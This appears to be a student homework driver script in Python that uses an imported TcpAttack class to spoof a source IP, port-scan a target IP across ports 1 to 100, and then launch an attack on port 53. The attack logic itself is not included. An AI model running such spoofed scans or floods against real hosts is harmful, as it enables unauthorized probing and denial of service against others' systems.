#!/usr/bin/env python

from Karakashev_hw08 import *

spoofIP='123.123.213.213';
targetIP='199.168.74.118';
rangeStart=1;#number
rangeEnd=100;#number
port=53;#number
Tcp = TcpAttack(spoofIP,targetIP)
Tcp.scanTarge(rangeStart,rangeEnd)
if (Tcp.attackTarget(port)):
    print("Por was open to attacks")